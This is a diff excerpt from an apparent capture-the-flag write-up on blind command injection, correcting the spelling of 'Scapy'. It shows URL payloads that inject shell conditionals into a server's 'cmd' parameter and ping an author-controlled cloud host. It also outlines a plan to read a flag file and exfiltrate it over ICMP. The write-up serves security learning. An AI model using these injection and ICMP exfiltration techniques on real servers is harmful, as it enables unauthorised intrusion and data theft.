@@ -15,13 +15,13 @@ I have started tcpdump on my cloud server and I was able to see ICMP packets.
 
 I took the advantage of ping command I have tried to check if hping3 or scappy were installed on linux box but unfortunately none of them were present on server as I was not able to see any ICMP requests for below condition: 
        
-       http://54.89.146.217/index.php?cmd=if test -e "/usr/bin/scappy";then ping -c2 http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com;fi;
+       http://54.89.146.217/index.php?cmd=if test -e "/usr/bin/Scapy";then ping -c2 http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com;fi;
        http://54.89.146.217/index.php?cmd=if test -e "/usr/sbin/hping3";then ping -c2 ec2-35-166-203-92.us-west-2.compute.amazonaws.com;fi;
 
 Alright so after spending enought time, I was able to figure out below important points:
 
 - OS Commands were being executed on the server side but it was not reflecting back in response. 
-- Server was also not accepting few utilities/commands like `wget`,`hping3`,`scappy`,`curl`,`http` and many more however it was accepting ping command so I need to read the flag file using some command and send that flag to my server through ICMP packet.
+- Server was also not accepting few utilities/commands like `wget`,`hping3`,`Scapy`,`curl`,`http` and many more however it was accepting ping command so I need to read the flag file using some command and send that flag to my server through ICMP packet.
 
 Before I execute any command blindly on CTF server, I thought to send few ICMP packets with some data from my local system to my cloud server.  
 
